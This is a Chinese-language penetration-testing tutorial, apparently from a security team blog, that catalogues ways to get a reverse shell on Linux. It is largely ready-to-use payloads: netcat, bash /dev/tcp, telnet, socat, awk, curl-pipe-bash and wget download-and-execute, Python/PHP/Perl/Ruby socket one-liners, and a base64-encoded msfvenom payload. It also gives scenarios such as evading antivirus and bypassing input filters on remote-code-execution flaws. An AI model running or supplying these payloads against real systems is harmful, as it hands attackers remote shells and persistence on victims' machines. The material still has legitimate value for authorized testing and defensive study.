## 概述

在渗透测试中，常常需要反弹shell，才能打开内网渗透的通道，以及后续的权限维持。但是由于各种原因，并不是每一次反弹都是非常顺利。因此，本文总结并分析多种反弹shell的方式，希望帮助各位实战的师傅。

### 原理

![](https://image.3001.net/images/20220529/1653794707_6292e79388add7dee58ca.jpg!small)

首先，需要理解正向连接和反向连接，正向连接是指由客户端向服务端发起连接请求，而反向连接则是相反。在反弹shell (reverse shell)
中，由客户端监听指定的 TCP/UDP 端口，由服务端发起连接请求到该端口，建立起shell连接。与常见的
Telnet、ssh等shell相比，不同的是由服务端主动发起。

### 场景

那么，在什么样的渗透场景下需要用到反弹 shell？

  * 由于防火墙等的控制访问策略，客户端无法访问服务端，但服务端可以向外网发起请求

  * IP会动态变化，攻击机无法直接连接

  * 向局域网中的主机散播木马病毒等，网络环境未知的情况下

  * 服务端的AV对正向连接的流量检测非常严格，但是对出网流量校验不足

在Linux和Windiows下，反弹shell的方式都有所不同，这里就分别展开叙述。

## 反弹方式

> 在不同的操作系统中，反弹shell的方式有所不同，这里就先总结Linux的反弹shell思路。

攻击过程：

  1. 客户端监听端口

    
    
    nc -l 9999
    

> 在不同的反弹shell方式中，都需要客户端监听，下文将不再赘述，仅讲述不同的反弹方式

  2. 服务端执行反弹命令

### Netcat

Netcat 是 Linux 系统下常用的网络工具，当然也有Windows版本，在 Linux 下使用命令 `nc`，前面的端口监听就是使用 Netcat

    
    
    # 目标主机中执行的反弹命令
    nc Your_IP Your_Port -e /bin/bash
    

### Bash

    
    
    # payload1
    bash -i >& /dev/tcp/Your_IP/Your_Port 0>&1
    
    # payload2
    bash -c "bash -i >& /dev/tcp/Your_IP/Your_Port 0>&1"
    

#### payload分析

Bash 是一个命令处理器，通常运行于文本窗口中，并能执行用户直接输入的命令。

  * bash -c  
后加Linux命令，如：`bash -c whoami`

  * bash -i  
产生一个bash交互环境

  * >&  
将联合符号前面的内容与后面相结合，然后一起重定向给后者。

  * `/dev/tcp/Your_IP/Your_Port`  
在Linux中，一切内容皆为文件，这里是与目标主机的指定端口建立一个TCP连接

  * 0>&1  
将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容

首先，Bash生成一个交互环境，在与目标主机建立TCP连接，再重定向TCP连接，然后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，最后得到一个交互式的shell。

### Telnet

Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。 它为用户提供了在本地计算机上完成远程主机工作的能力。
在终端使用者的电脑上使用telnet程序，用它连接到服务器。

#### 方法一

  1. 攻击主机使用 nc 开启监听

  2. 目标主机触发

    
    
    mknod a p; telnet Your_IP Your_Port 0<a | /bin/bash 1>a
    

#### 方法二

  1. 攻击机需要开启两个端口监听，一个用于输入命令，一个用于回显命令执行的结果

    
    
    nc -l Your_cmd_Port
    nc -l Your_result_Port
    

  2. 目标主机触发

    
    
    telnet Your_IP Your_cmd_Port | /bin/bash | telnet Your_IP Your_result_Port
    

> 此外，在一些工控设备中，常常由 telnetd 程序，也可以利用其来开启正向的shell
>
>   1. 目标主机开启监听
>
>

>  
>  
>     telnetd -p Your_Port -l /bin/sh
>  
>
>   2. 攻击主机正向连接
>
>

>  
>  
>     telnet Your_IP Your_Port
>  

### Socat

Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，但功能比
netcat强大。

需要注意的是，Socat 并不是大多数Linux发行版本会预装的软件，但在 Ubuntu 中，是支持 apt-get直接安装的：

    
    
    apt-get install socat
    

  1. 攻击主机开启监听，可以使用原来的nc，也可以一样使用 socat

    
    
    socat TCP-LISTEN:2333 -    

  2. 目标主机中触发

    
    
    socat tcp-connect:Your_IP:Your_Port exec:'bash -li',pty,stderr,setsid,sigint,sane
    

### awk

AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。在众多的Linux发行版本中，都会预装这个应用程序。

  1. 攻击主机开启监听

    
    
    nc -l 9999
    

  2. 目标主机触发 payload

    
    
    awk 'BEGIN{s="/inet/tcp/0/Your_IP/Your_Listening_Port";for(;s|&getline c;close(c))while(c|getline)print|&ampsclose(s)}'
    

### Curl

  1. 在攻击主机上建立HTTP服务，同时将 payload 写进文件

    
    
    # 新建payload
    cd /tmp
    echo 'bash -c "bash -i >& /dev/tcp/Your_IP/Your_Port 0>&1"' > index.html
    
    # 开启Web服务
    python3 -m http.server 80
    

  2. 在攻击机上开启nc监听，跟前文提及的一样

  3. 在目标主机触发payload

    
    
    curl http://Your_IP|bash
    

适用场景是绕过某些安全校验，如某个站点存在 rce，但是此时对用户的输入存在校验，导致无法直接使用payload，这里用 Curl
先将payload下载下来，再通过管道符号传递给 Bash 程序。

> TIPS：此处的IP可以是任意的可解析格式，如十进制、十六进制等等，可参考 SSRF 中的IP过滤绕过

### wget

  1. 服务端配置以及端口监听步骤，和 Curl 服务端完全一致

  2. 在目标主机触发payload

    
    
    wget http://Your_IP -O /tmp/1.sh &&chmod 777 /tmp/1.sh && /tmp/1.sh
    

适用场景同 Curl。

### 脚本反弹shell

在渗透测试中，还能根据目标主机上具备的脚本运行环境，选择适用的脚本进行反弹shell。在不存在脚本环境的情况下，也能选择方便安装的环境进行安装。以上的
bash 反弹 shell payload，在环境允许的情况下，都可以替换成以下的脚本 payload。

#### Python

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Your_IP",Your_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    

#### PHP

    
    
    php -r '$sock=fsockopen("Your_IP","Your_Port");exec("/bin/sh -i <&3 >&3 2>&3");'
    

#### Perl

    
    
    perl -e 'use Socket;$i="Your_IP";$p=Your_Port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
    

#### ruby

    
    
    ruby -rsocket -e 'c=TCPSocket.new("Your_IP","Your_Port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    

### Metasploit

Metasploit 是一个开源的框架，一套针对远程主机进行开发和执行 exploit代码 的工具。其中，就集成了反弹shell的工具 msfvenom。

    
    
    # 1. 查询payload
    msfvenom -l payloads | grep 'cmd/unix/reverse'
    
    
    # 2. 生成反弹 shell 的 payload
    msfvenom -p cmd/unix/reverse_python LHOST=Your_IP LPORT=Your_Port -f raw
    
    # 3. 先开启监听，再将生成的payload在目标主机执行即可
    Payload size: 517 bytes
    python -c "exec('aW1wb3J0IHNvY2tldCwgICAgc3VicHJvY2VzcywgICAgb3MgICAgIDsgICAgICAgIGhvc3Q9IjE5Mi4xNjguMS4xIiAgICAgOyAgICAgICAgcG9ydD04MDAwICAgICA7ICAgICAgICBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsICAgIHNvY2tldC5TT0NLX1NUUkVBTSkgICAgIDsgICAgICAgIHMuY29ubmVjdCgoaG9zdCwgICAgcG9ydCkpICAgICA7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgIDApICAgICA7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgIDEpICAgICA7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksICAgIDIpICAgICA7ICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"
    

> 进行 Base64 解码后就会发现，生成的就是 Python中的 payload

## 总结

以上就是 Linux 中常见的反弹shell方式，希望能在渗透测试中，帮助各位师傅打开内网渗透测试的通道。除了 Linux
操作系统，在内网机器中，Windows主机也非常常见，下一篇将会总结 Windows 下常见的反弹 shell 方式。

## 声明

  1. 本文初衷为分享网络安全知识，请勿利用技术做出任何危害网络安全的行为，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由 **使用者** 本人负责，与SpaceSec安全团队及作者无关！

  2. 文章中部分学习内容来自于网络，回馈予网络，如涉及版权问题，请联系删除。

  3. SpaceSec 保留对文章绝对的解释权，转载与传播时须保证文章的完整性，同时标明出处。未经允许，禁止转载或用于商业用途。

## 参考

https://masterxsec.github.io/2017/07/21/Linux%E5%8F%8D%E5%BC%B9shell%E7%9A%8410%E7%A7%8D%E5%A7%BF%E5%8A%BF/

